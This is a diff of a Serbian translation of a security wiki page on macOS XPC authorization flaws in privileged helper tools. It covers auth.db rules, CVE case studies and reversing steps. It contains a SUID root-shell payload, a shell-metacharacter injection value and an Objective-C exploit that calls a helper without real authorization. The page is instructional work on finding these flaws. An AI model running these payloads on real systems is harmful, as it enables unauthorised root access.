@@ -4,13 +4,13 @@
 
 ## XPC Authorization
 
-Apple takođe nudi drugi način za proveru da li proces koji se povezuje ima **dozvole za pozivanje izložene XPC metode**.
+Apple takođe predlaže drugi način provere da li povezani proces ima **permissions to call the an exposed XPC method**.
 
-Kada aplikacija treba da **izvršava radnje kao privilegovani korisnik**, umesto da pokreće aplikaciju kao privilegovani korisnik, ona obično instalira HelperTool kao root, kao XPC servis koji aplikacija može pozvati radi izvršavanja tih radnji. Međutim, aplikacija koja poziva servis treba da ima odgovarajuću autorizaciju.
+Kada aplikacija treba da **izvršava radnje kao privilegovani korisnik**, umesto pokretanja aplikacije kao privilegovanog korisnika, ona obično instalira HelperTool kao root-a kao XPC service koji aplikacija može da pozove radi izvršavanja tih radnji. Međutim, aplikacija koja poziva service trebalo bi da ima dovoljnu autorizaciju.
 
 ### ShouldAcceptNewConnection always YES
 
-Primer se može pronaći u [EvenBetterAuthorizationSample](https://github.com/brenwell/EvenBetterAuthorizationSample). U `App/AppDelegate.m` pokušava da se **poveže** sa **HelperTool**. A u `HelperTool/HelperTool.m` funkcija **`shouldAcceptNewConnection`** **ne proverava** nijedan od prethodno navedenih zahteva. Uvek vraća YES:<sup>[1]</sup>
+Primer se može pronaći u [EvenBetterAuthorizationSample](https://github.com/brenwell/EvenBetterAuthorizationSample). U `App/AppDelegate.m` pokušava da se **poveže** sa **HelperTool**. A u `HelperTool/HelperTool.m`, funkcija **`shouldAcceptNewConnection`** **neće proveravati** nijedan od prethodno navedenih zahteva. Uvek će vratiti YES:<sup>[[1]](#references)</sup>
 ```objectivec
 - (BOOL)listener:(NSXPCListener *)listener shouldAcceptNewConnection:(NSXPCConnection *)newConnection
 // Called by our XPC listener when a new connection comes in.  We configure the connection
@@ -27,7 +27,7 @@ newConnection.exportedObject = self;
 return YES;
 }
 ```
-Za više informacija o pravilnom konfigurisanja ove provere:
+Za više informacija o pravilnom konfigurisanju ove provere:
 
 
 {{#ref}}
@@ -38,8 +38,8 @@ macos-xpc-connecting-process-check/
 
 Međutim, **autorizacija se obavlja kada se pozove metoda iz HelperTool-a**.
 
-Funkcija **`applicationDidFinishLaunching`** iz `App/AppDelegate.m` kreira praznu autorizacionu referencu nakon pokretanja aplikacije. Ovo bi uvek trebalo da funkcioniše.\
-Zatim će pokušati da **doda određena prava** toj autorizacionoj referenci pozivanjem funkcije `setupAuthorizationRights`:
+Funkcija **`applicationDidFinishLaunching`** iz `App/AppDelegate.m` kreira praznu authorization referencu nakon pokretanja aplikacije. Ovo bi uvek trebalo da funkcioniše.\
+Zatim će pokušati da **doda neka prava** toj authorization referenci pozivanjem funkcije `setupAuthorizationRights`:
 ```objectivec
 - (void)applicationDidFinishLaunching:(NSNotification *)note
 {
@@ -63,7 +63,7 @@ if (self->_authRef) {
 [self.window makeKeyAndOrderFront:self];
 }
 ```
-Funkcija `setupAuthorizationRights` iz `Common/Common.m` će u auth bazi `/var/db/auth.db` sačuvati prava aplikacije. Obratite pažnju na to da će dodati samo prava koja još nisu u bazi:
+Funkcija `setupAuthorizationRights` iz `Common/Common.m` čuva prava aplikacije u auth bazi podataka `/var/db/auth.db`. Obratite pažnju na to da će dodati samo prava koja još nisu u bazi podataka:
 ```objectivec
 + (void)setupAuthorizationRights:(AuthorizationRef)authRef
 // See comment in header.
@@ -173,15 +173,15 @@ block(authRightName, authRightDefault, authRightDesc);
 }];
 }
 ```
-To znači da će na kraju ovog procesa dozvole deklarisane unutar `commandInfo` biti sačuvane u `/var/db/auth.db`. Obratite pažnju na to da se tamo za **svaki metod** koji će **zahtevati autentikaciju**, mogu pronaći **naziv dozvole** i **`kCommandKeyAuthRightDefault`**. Ovo drugo **označava ko može da dobije ovo pravo**.
+To znači da će na kraju ovog procesa dozvole deklarisane unutar `commandInfo` biti sačuvane u `/var/db/auth.db`. Obratite pažnju na to da se tamo za **svaki metod** koji će **zahtevati autentikaciju** mogu pronaći **ime dozvole** i **`kCommandKeyAuthRightDefault`**. Ovo drugo **označava ko može da dobije ovo pravo**.
 
-Postoje različiti opsezi kojima se označava ko može da pristupi određenom pravu. Neki od njih su definisani u [AuthorizationDB.h](https://github.com/aosm/Security/blob/master/Security/libsecurity_authorization/lib/AuthorizationDB.h) (sve ih možete pronaći [ovde](https://www.dssw.co.uk/reference/authorization-rights/)), ali ukratko:
+Postoje različiti opsezi kojima se označava ko može da pristupi određenom pravu. Neki od njih su definisani u [AuthorizationDB.h](https://github.com/aosm/Security/blob/master/Security/libsecurity_authorization/lib/AuthorizationDB.h) (možete pronaći [sve njih ovde](https://www.dssw.co.uk/reference/authorization-rights/)), ali ukratko:
 
-<table><thead><tr><th width="284.3333333333333">Name</th><th width="165">Value</th><th>Description</th></tr></thead><tbody><tr><td>kAuthorizationRuleClassAllow</td><td>allow</td><td>Bilo ko</td></tr><tr><td>kAuthorizationRuleClassDeny</td><td>deny</td><td>Niko</td></tr><tr><td>kAuthorizationRuleIsAdmin</td><td>is-admin</td><td>Trenutni korisnik mora biti administrator (u admin grupi)</td></tr><tr><td>kAuthorizationRuleAuthenticateAsSessionUser</td><td>authenticate-session-owner</td><td>Zatražite od korisnika da se autentifikuje.</td></tr><tr><td>kAuthorizationRuleAuthenticateAsAdmin</td><td>authenticate-admin</td><td>Zatražite od korisnika da se autentifikuje. Mora biti administrator (u admin grupi)</td></tr><tr><td>kAuthorizationRightRule</td><td>rule</td><td>Navodi pravila</td></tr><tr><td>kAuthorizationComment</td><td>comment</td><td>Navodi dodatne komentare o pravu</td></tr></tbody></table>
+<table><thead><tr><th width="284.3333333333333">Naziv</th><th width="165">Vrednost</th><th>Opis</th></tr></thead><tbody><tr><td>kAuthorizationRuleClassAllow</td><td>allow</td><td>Bilo ko</td></tr><tr><td>kAuthorizationRuleClassDeny</td><td>deny</td><td>Niko</td></tr><tr><td>kAuthorizationRuleIsAdmin</td><td>is-admin</td><td>Trenutni korisnik mora biti administrator (u admin grupi)</td></tr><tr><td>kAuthorizationRuleAuthenticateAsSessionUser</td><td>authenticate-session-owner</td><td>Zatražite od korisnika da se autentifikuje.</td></tr><tr><td>kAuthorizationRuleAuthenticateAsAdmin</td><td>authenticate-admin</td><td>Zatražite od korisnika da se autentifikuje. Mora biti administrator (u admin grupi)</td></tr><tr><td>kAuthorizationRightRule</td><td>rule</td><td>Navodi pravila</td></tr><tr><td>kAuthorizationComment</td><td>comment</td><td>Navodi dodatne komentare o pravu</td></tr></tbody></table>
 
 ### Provera prava
 
-U `HelperTool/HelperTool.m`, funkcija **`readLicenseKeyAuthorization`** proverava da li je pozivalac ovlašćen da **izvrši ovaj metod** pozivanjem funkcije **`checkAuthorization`**. Ova funkcija proverava da li **`authData`** koje je poslao pozivajući proces ima **ispravan format**, a zatim proverava **šta je potrebno da bi se dobilo pravo** za pozivanje konkretnog metoda. Ako sve prođe uspešno, vraćeni **`error` će biti `nil`**:
+U `HelperTool/HelperTool.m`, funkcija **`readLicenseKeyAuthorization`** proverava da li je pozivalac ovlašćen da **izvrši ovaj metod** pozivanjem funkcije **`checkAuthorization`**. Ova funkcija proverava da li **`authData`** koji je poslao proces pozivalac ima **ispravan format**, a zatim proverava **šta je potrebno da bi se dobilo pravo** za pozivanje konkretnog metoda. Ako sve prođe kako treba, **vraćeni `error` će biti `nil`**:
 ```objectivec
 - (NSError *)checkAuthorization:(NSData *)authData command:(SEL)command
 {
@@ -229,11 +229,11 @@ assert(junk == errAuthorizationSuccess);
 return error;
 }
 ```
-Imajte na umu da će, da bi **proverila zahteve za dobijanje prava** za pozivanje te metode, funkcija `authorizationRightForCommand` samo proveriti prethodno pomenuti objekat **`commandInfo`**. Zatim će pozvati **`AuthorizationCopyRights`** da proveri **da li ima prava** za pozivanje funkcije (imajte na umu da zastavice omogućavaju interakciju sa korisnikom).
+Imajte na umu da će, kako bi **proverila uslove za dobijanje prava** pozivanja te metode, funkcija `authorizationRightForCommand` samo proveriti prethodno pomenuti objekat **`commandInfo`**. Zatim će pozvati **`AuthorizationCopyRights`** da proveri **da li ima potrebna prava** za pozivanje funkcije (imajte na umu da zastavice omogućavaju interakciju sa korisnikom).
 
-U ovom slučaju, za pozivanje funkcije `readLicenseKeyAuthorization`, `kCommandKeyAuthRightDefault` je definisan kao `@kAuthorizationRuleClassAllow`. Dakle, **svako može da je pozove**.
+U ovom slučaju, za pozivanje funkcije `readLicenseKeyAuthorization`, `kCommandKeyAuthRightDefault` je definisan kao `@kAuthorizationRuleClassAllow`. Zato **svako može da je pozove**.
 
-### DB informacije
+### Informacije o DB-u
 
 Pomenuto je da se ove informacije čuvaju u `/var/db/auth.db`. Sva sačuvana pravila možete izlistati pomoću:
 ```sql
@@ -241,25 +241,25 @@ sudo sqlite3 /var/db/auth.db
 SELECT name FROM rules;
 SELECT name FROM rules WHERE name LIKE '%safari%';
 ```
-Zatim možete pročitati ko može da pristupi pravu pomoću:
+Zatim možete pročitati ko može da pristupi ovom pravu pomoću:
 ```bash
 security authorizationdb read com.apple.safaridriver.allow
 ```
-### Dozvole bez ograničenja
+### Permisivna prava
 
 Možete pronaći **sve konfiguracije dozvola** [**ovde**](https://www.dssw.co.uk/reference/authorization-rights/), ali kombinacije koje neće zahtevati interakciju korisnika bile bi:
 
 1. **'authenticate-user': 'false'**
-- Ovo je najdirektniji ključ. Ako je postavljen na `false`, navodi da korisnik ne mora da pruži autentifikaciju da bi dobio ovo pravo.
-- Koristi se **u kombinaciji sa jednim od 2 ključa u nastavku ili uz navođenje grupe** kojoj korisnik mora pripadati.
+- Ovo je najdirektniji ključ. Ako je podešen na `false`, navodi da korisnik ne mora da pruži autentifikaciju da bi dobio ovo pravo.
+- Koristi se **u kombinaciji sa jednom od 2 opcije ispod ili uz navođenje grupe** kojoj korisnik mora pripadati.
 2. **'allow-root': 'true'**
-- Ako korisnik radi kao root korisnik (koji ima povišene privilegije), a ovaj ključ je postavljen na `true`, root korisnik bi potencijalno mogao da dobije ovo pravo bez dodatne autentifikacije. Međutim, dobijanje root statusa obično već zahteva autentifikaciju, tako da ovo za većinu korisnika nije scenario „bez autentifikacije“.
+- Ako korisnik radi kao root korisnik (koji ima povišene dozvole), a ovaj ključ je podešen na `true`, root korisnik bi potencijalno mogao da dobije ovo pravo bez dodatne autentifikacije. Međutim, dobijanje statusa root korisnika obično već zahteva autentifikaciju, tako da ovo za većinu korisnika nije scenario „bez autentifikacije“.
 3. **'session-owner': 'true'**
-- Ako je postavljeno na `true`, vlasnik sesije (trenutno prijavljeni korisnik) automatski bi dobio ovo pravo. Ovo može zaobići dodatnu autentifikaciju ako je korisnik već prijavljen.
+- Ako je podešen na `true`, vlasnik sesije (trenutno prijavljeni korisnik) automatski bi dobio ovo pravo. Ovo može zaobići dodatnu autentifikaciju ako je korisnik već prijavljen.
 4. **'shared': 'true'**
-- Ovaj ključ ne dodeljuje prava bez autentifikacije. Umesto toga, ako je postavljen na `true`, to znači da se, nakon autentifikacije prava, ona mogu deliti između više procesa, bez potrebe da se svaki proces ponovo autentifikuje. Međutim, početno dodeljivanje prava i dalje bi zahtevalo autentifikaciju, osim ako nije kombinovano sa drugim ključevima, kao što je `'authenticate-user': 'false'`.
+- Ovaj ključ ne dodeljuje prava bez autentifikacije. Umesto toga, ako je podešen na `true`, to znači da, nakon autentifikacije prava, ono može da se deli između više procesa bez potrebe da se svaki od njih ponovo autentifikuje. Međutim, početno dodeljivanje prava i dalje bi zahtevalo autentifikaciju, osim ako se ne kombinuje sa drugim ključevima kao što je `'authenticate-user': 'false'`.
 
-Možete [**koristiti ovu skriptu**](https://gist.github.com/carlospolop/96ecb9e385a4667b9e40b24e878652f9) da biste dobili zanimljiva prava:
+Možete [**koristiti ovu skriptu**](https://gist.github.com/carlospolop/96ecb9e385a4667b9e40b24e878652f9) da dobijete zanimljiva prava:
 ```bash
 Rights with 'authenticate-user': 'false':
 is-admin (admin), is-admin-nonshared (admin), is-appstore (_appstore), is-developer (_developer), is-lpadmin (_lpadmin), is-root (run as root), is-session-owner (session owner), is-webdeveloper (_webdeveloper), system-identity-write-self (session owner), system-install-iap-software (run as root), system-install-software-iap (run as root)
@@ -270,48 +270,48 @@ com-apple-aosnotification-findmymac-remove, com-apple-diskmanagement-reservekek,
 Rights with 'session-owner': 'true':
 authenticate-session-owner, authenticate-session-owner-or-admin, authenticate-session-user, com-apple-safari-allow-apple-events-to-run-javascript, com-apple-safari-allow-javascript-in-smart-search-field, com-apple-safari-allow-unsigned-app-extensions, com-apple-safari-install-ephemeral-extensions, com-apple-safari-show-credit-card-numbers, com-apple-safari-show-passwords, com-apple-icloud-passwordreset, com-apple-icloud-passwordreset, is-session-owner, system-identity-write-self, use-login-window-ui
 ```
-### Studije slučaja zaobilaženja autorizacije
+### Primeri zaobilaženja autorizacije
 
-- **CVE-2025-65842 – Acustica Audio Aquarius HelperTool**: Privileged Mach service `com.acustica.HelperTool` prihvata svaku konekciju, a njegova rutina `checkAuthorization:` poziva `AuthorizationCopyRights(NULL, …)`, tako da bilo koji blob od 32 bajta prolazi. `executeCommand:authorization:withReply:` zatim prosleđuje stringove razdvojene zarezima, kojima upravlja attacker, u `NSTask` kao root, omogućavajući payload-e kao što su:
+- **CVE-2025-65842 – Acustica Audio Aquarius HelperTool**: Privilegovani Mach service `com.acustica.HelperTool` prihvata svaku konekciju, a njegova rutina `checkAuthorization:` poziva `AuthorizationCopyRights(NULL, …)`, tako da bilo koji blob od 32 bajta prolazi. `executeCommand:authorization:withReply:` zatim prosleđuje stringove razdvojene zarezima, pod kontrolom napadača, u `NSTask` kao root, što omogućava payload-e kao što su:
 ```bash
 "/bin/sh,-c,cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash"
 ```
-trivijalno kreirati SUID root shell. Detalji su u [ovom write-upu](https://almightysec.com/helpertool-xpc-service-local-privilege-escalation/).<sup>[6]</sup>
-- **CVE-2025-55076 – Plugin Alliance InstallationHelper**: Listener uvek vraća YES, a isti NULL `AuthorizationCopyRights` obrazac pojavljuje se u `checkAuthorization:`. Metod `exchangeAppWithReply:` dva puta konkatenira attacker input u `system()` string, pa ubacivanje shell metakaraktera u `appPath` (npr. `"/Applications/Test.app";chmod 4755 /tmp/rootbash;`) omogućava izvršavanje root koda putem Mach servisa `com.plugin-alliance.pa-installationhelper`. Više informacija [ovde](https://almightysec.com/Plugin-Alliance-HelperTool-XPC-Service-Local-Privilege-Escalation/).<sup>[7]</sup>
-- **CVE-2024-4395 – Jamf Compliance Editor helper**: Pokretanje audita kreira `/Library/LaunchDaemons/com.jamf.complianceeditor.helper.plist`, izlaže Mach servis `com.jamf.complianceeditor.helper` i eksportuje `-executeScriptAt:arguments:then:` bez verifikacije `AuthorizationExternalForm` ili code signature pozivaoca. Trivijalan exploit poziva `AuthorizationCreate` sa praznom referencom, povezuje se pomoću `[[NSXPCConnection alloc] initWithMachServiceName:options:NSXPCConnectionPrivileged]` i poziva metod za izvršavanje proizvoljnih binarnih datoteka kao root. Kompletne beleške o reverse engineeringu (uz PoC) nalaze se u [write-upu autora Mykola Grymalyuka](https://khronokernel.com/macos/2024/05/01/CVE-2024-4395.html).<sup>[4]</sup>
-- **CVE-2025-25251 – FortiClient Mac helper**: FortiClient Mac 7.0.0–7.0.14, 7.2.0–7.2.8 i 7.4.0–7.4.2 prihvatali su posebno kreirane XPC poruke koje su stizale do privilegovanog helpera bez authorization kontrola. Pošto je helper verovao sopstvenom privilegovanom `AuthorizationRef`, svaki lokalni korisnik koji je mogao da šalje poruke servisu mogao je da ga navede da izvrši proizvoljne izmene konfiguracije ili komande kao root. Detalji se nalaze u [sažetku preporuke kompanije SentinelOne](https://www.sentinelone.com/vulnerability-database/cve-2025-25251/).<sup>[5]</sup>
+trivijalno kreirati SUID root shell. Detalji su dostupni u [ovom write-up-u](https://almightysec.com/helpertool-xpc-service-local-privilege-escalation/).<sup>[[6]](#references)</sup>
+- **CVE-2025-55076 – Plugin Alliance InstallationHelper**: Listener uvek vraća YES, a isti NULL obrazac `AuthorizationCopyRights` pojavljuje se u `checkAuthorization:`. Metod `exchangeAppWithReply:` dva puta konkatenira input napadača u `system()` string, pa ubacivanje shell metakaraktera u `appPath` (npr. `"/Applications/Test.app";chmod 4755 /tmp/rootbash;`) omogućava izvršavanje koda sa root privilegijama putem Mach servisa `com.plugin-alliance.pa-installationhelper`. Više informacija [ovde](https://almightysec.com/Plugin-Alliance-HelperTool-XPC-Service-Local-Privilege-Escalation/).<sup>[[7]](#references)</sup>
+- **CVE-2024-4395 – Jamf Compliance Editor helper**: Pokretanje audit-a kreira `/Library/LaunchDaemons/com.jamf.complianceeditor.helper.plist`, izlaže Mach servis `com.jamf.complianceeditor.helper` i eksportuje `-executeScriptAt:arguments:then:` bez provere `AuthorizationExternalForm` ili code signature-a pozivaoca. Trivijalan exploit kreira prazan referentni objekat pomoću `AuthorizationCreate`, povezuje se koristeći `[[NSXPCConnection alloc] initWithMachServiceName:options:NSXPCConnectionPrivileged]` i poziva metod za izvršavanje proizvoljnih binarnih fajlova sa root privilegijama. Kompletne beleške o reverse engineering-u (uz PoC) nalaze se u [write-up-u Mykole Grymalyuka](https://khronokernel.com/macos/2024/05/01/CVE-2024-4395.html).<sup>[[4]](#references)</sup>
+- **CVE-2025-25251 – FortiClient Mac helper**: FortiClient Mac 7.0.0–7.0.14, 7.2.0–7.2.8 i 7.4.0–7.4.2 prihvatali su posebno kreirane XPC poruke koje su dolazile do privilegovanog helper-a bez authorization kontrola. Pošto je helper verovao sopstvenom privilegovanom `AuthorizationRef`-u, svaki lokalni korisnik koji je mogao da šalje poruke servisu mogao je da ga primora da izvrši proizvoljne izmene konfiguracije ili komande sa root privilegijama. Detalji su dostupni u [SentinelOne sažetku advisora](https://www.sentinelone.com/vulnerability-database/cve-2025-25251/).<sup>[[5]](#references)</sup>
 
-#### Saveti za brzu trijažu
+#### Saveti za brzi triage
 
-- Kada aplikacija isporučuje i GUI i helper, uporedite njihove code requirements i proverite da li `shouldAcceptNewConnection` zaključava listener pomoću `-setCodeSigningRequirement:` (ili validira `SecCodeCopySigningInformation`). Nedostatak provera obično dovodi do scenarija CWE-863, kao u slučaju Jamf-a. Brzi pregled izgleda ovako:
+- Kada aplikacija isporučuje i GUI i helper, uporedite njihove code zahteve i proverite da li `shouldAcceptNewConnection` zaključava listener pomoću `-setCodeSigningRequirement:` (ili validira `SecCodeCopySigningInformation`). Nedostatak provera obično dovodi do scenarija CWE-863, kao u slučaju Jamf-a. Brz uvid izgleda ovako:
 ```bash
 codesign --display --requirements - /Applications/Jamf\ Compliance\ Editor.app
 ```
-- Uporedite šta helper *smatra* da autorizuje sa onim što klijent prosleđuje. Prilikom reverse engineering-a, postavite breakpoint na `AuthorizationCopyRights` i potvrdite da `AuthorizationRef` potiče iz `AuthorizationCreateFromExternalForm` (obezbeđuje ga klijent), a ne iz sopstvenog privilegovanog konteksta helper-a; u suprotnom ste verovatno pronašli obrazac CWE-863, sličan prethodno navedenim slučajevima.
+- Uporedite ono što helper *misli* da autorizuje sa onim što klijent prosleđuje. Prilikom reverse engineeringa, postavite breakpoint na `AuthorizationCopyRights` i potvrdite da `AuthorizationRef` potiče iz `AuthorizationCreateFromExternalForm` (obezbeđuje ga klijent), a ne iz sopstvenog privilegovanog konteksta helpera; u suprotnom ste verovatno pronašli CWE-863 obrazac sličan prethodnim slučajevima.
 
-## Reverse engineering Authorization-a
+## Reversing Authorization
 
 ### Provera da li se koristi EvenBetterAuthorization
 
-Ako pronađete funkciju: **`[HelperTool checkAuthorization:command:]`**, proces verovatno koristi prethodno pomenutu šemu za autorizaciju:
+Ako pronađete funkciju: **`[HelperTool checkAuthorization:command:]`**, proces verovatno koristi prethodno opisanu šemu za autorizaciju:
 
 <figure><img src="../../../../../images/image (42).png" alt=""><figcaption></figcaption></figure>
 
-Ako ova funkcija poziva funkcije kao što su `AuthorizationCreateFromExternalForm`, `authorizationRightForCommand`, `AuthorizationCopyRights`, `AuhtorizationFree`, koristi [**EvenBetterAuthorizationSample**](https://github.com/brenwell/EvenBetterAuthorizationSample/blob/e1052a1855d3a5e56db71df5f04e790bfd4389c4/HelperTool/HelperTool.m#L101-L154).
+Ovo, ako ova funkcija poziva funkcije kao što su `AuthorizationCreateFromExternalForm`, `authorizationRightForCommand`, `AuthorizationCopyRights`, `AuhtorizationFree`, znači da koristi [**EvenBetterAuthorizationSample**](https://github.com/brenwell/EvenBetterAuthorizationSample/blob/e1052a1855d3a5e56db71df5f04e790bfd4389c4/HelperTool/HelperTool.m#L101-L154).
 
 Proverite **`/var/db/auth.db`** da biste videli da li je moguće dobiti dozvole za pozivanje neke privilegovane radnje bez interakcije korisnika.
 
-### Komunikacija putem protokola
+### Protocol Communication
 
-Zatim treba da pronađete šemu protokola kako biste mogli da uspostavite komunikaciju sa XPC servisom.
+Zatim je potrebno pronaći šemu protokola kako biste mogli da uspostavite komunikaciju sa XPC servisom.
 
-Funkcija **`shouldAcceptNewConnection`** ukazuje na izvezeni protokol:
+Funkcija **`shouldAcceptNewConnection`** ukazuje na eksportovani protokol:
 
 <figure><img src="../../../../../images/image (44).png" alt=""><figcaption></figcaption></figure>
 
 U ovom slučaju imamo isto što i u EvenBetterAuthorizationSample; [**proverite ovu liniju**](https://github.com/brenwell/EvenBetterAuthorizationSample/blob/e1052a1855d3a5e56db71df5f04e790bfd4389c4/HelperTool/HelperTool.m#L94).
 
-Kada znate naziv korišćenog protokola, moguće je **izbaciti njegovu definiciju header-a** pomoću:
+Kada znate naziv korišćenog protokola, moguće je **izdvojiti njegovu definiciju headera** pomoću:
 ```bash
 class-dump /Library/PrivilegedHelperTools/com.example.HelperTool
 
@@ -325,13 +325,13 @@ class-dump /Library/PrivilegedHelperTools/com.example.HelperTool
 @end
 [...]
 ```
-Na kraju, samo treba da saznamo **naziv izloženog Mach Service-a** kako bismo uspostavili komunikaciju sa njim. Postoji nekoliko načina da to pronađemo:
+Na kraju, samo treba da saznamo **ime izloženog Mach Service-a** kako bismo uspostavili komunikaciju sa njim. Postoji nekoliko načina da to pronađemo:
 
-- U **`[HelperTool init]`**, gde možete videti koji se Mach Service koristi:
+- U **`[HelperTool init]`**, gde možete videti Mach Service koji se koristi:
 
 <figure><img src="../../../../../images/image (41).png" alt=""><figcaption></figcaption></figure>
 
-- U launchd plist fajlu:
+- U launchd plist-u:
 ```xml
 cat /Library/LaunchDaemons/com.example.HelperTool.plist
 
@@ -344,14 +344,14 @@ cat /Library/LaunchDaemons/com.example.HelperTool.plist
 </dict>
 [...]
 ```
-### Primer exploit-a
+### Exploit primer
 
-U ovom primeru kreirani su:
+U ovom primeru kreiraju se:
 
 - Definicija protokola sa funkcijama
 - Prazan auth koji se koristi za zahtev za pristup
 - Veza sa XPC service-om
-- Poziv funkcije ako je veza uspešno uspostavljena
+- Poziv funkcije ako je veza uspešna
 ```objectivec
 // gcc -framework Foundation -framework Security expl.m -o expl
 
@@ -429,19 +429,19 @@ NSLog(@"Response: %@", error);
 NSLog(@"Finished!");
 }
 ```
-## Drugi zloupotrebljeni XPC pomoćnici za privilegije
+## Drugi zloupotrebljeni XPC privilege helpers
 
-- [https://blog.securelayer7.net/applied-endpointsecurity-framework-previlege-escalation/?utm_source=pocket_shared](https://blog.securelayer7.net/applied-endpointsecurity-framework-previlege-escalation/?utm_source=pocket_shared)<sup>[8]</sup>
+- [https://blog.securelayer7.net/applied-endpointsecurity-framework-previlege-escalation/?utm_source=pocket_shared](https://blog.securelayer7.net/applied-endpointsecurity-framework-previlege-escalation/?utm_source=pocket_shared)<sup>[[8]](#references)</sup>
 
 ## Reference
 
-- [1] [Apple Developer — EvenBetterAuthorizationSample](https://developer.apple.com/library/archive/samplecode/EvenBetterAuthorizationSample/Introduction/Intro.html) ([mirror na GitHub-u](https://github.com/brenwell/EvenBetterAuthorizationSample))
+- [1] [Apple Developer — EvenBetterAuthorizationSample](https://developer.apple.com/library/archive/samplecode/EvenBetterAuthorizationSample/Introduction/Intro.html) ([mirror on GitHub](https://github.com/brenwell/EvenBetterAuthorizationSample))
 - [2] [Apple Developer — Authorization Services](https://developer.apple.com/documentation/security/authorization-services)
 - [3] [Apple Developer — `AuthorizationCopyRights`](https://developer.apple.com/documentation/security/authorizationcopyrights(_:_:_:_:_:))
-- [4] [CVE-2024-4395: Eskalacija privilegija u Jamf Compliance Editor-u](https://khronokernel.com/macos/2024/05/01/CVE-2024-4395.html)
-- [5] [CVE-2025-25251: Propust eskalacije privilegija u FortiClient Mac-u](https://www.sentinelone.com/vulnerability-database/cve-2025-25251/)
-- [6] [CVE-2025-65842 – Lokalna eskalacija privilegija u Aquarius Desktop-u na macOS-u putem Acustica Audio HelperTool XPC Service-a](https://almightysec.com/helpertool-xpc-service-local-privilege-escalation/)
-- [7] [CVE-2025-55076 – Lokalna eskalacija privilegija putem Plugin Alliance InstallationHelper XPC Service-a](https://almightysec.com/Plugin-Alliance-HelperTool-XPC-Service-Local-Privilege-Escalation/)
-- [8] [CVE-2019-8805: Eskalacija privilegija u Apple EndpointSecurity framework-u (SecureLayer7)](https://blog.securelayer7.net/applied-endpointsecurity-framework-previlege-escalation/?utm_source=pocket_shared)
+- [4] [CVE-2024-4395: Privilege Escalation u Jamf Compliance Editor-u](https://khronokernel.com/macos/2024/05/01/CVE-2024-4395.html)
+- [5] [CVE-2025-25251: Privilege Escalation propust u FortiClient Mac-u](https://www.sentinelone.com/vulnerability-database/cve-2025-25251/)
+- [6] [CVE-2025-65842 – Lokalni Privilege Escalation u Aquarius Desktop-u na macOS-u preko Acustica Audio HelperTool XPC Service-a](https://almightysec.com/helpertool-xpc-service-local-privilege-escalation/)
+- [7] [CVE-2025-55076 – Lokalni Privilege Escalation preko Plugin Alliance InstallationHelper XPC Service-a](https://almightysec.com/Plugin-Alliance-HelperTool-XPC-Service-Local-Privilege-Escalation/)
+- [8] [CVE-2019-8805: Privilege Escalation u Apple EndpointSecurity framework-u (SecureLayer7)](https://blog.securelayer7.net/applied-endpointsecurity-framework-previlege-escalation/?utm_source=pocket_shared)
 
 {{#include ../../../../../banners/hacktricks-training.md}}
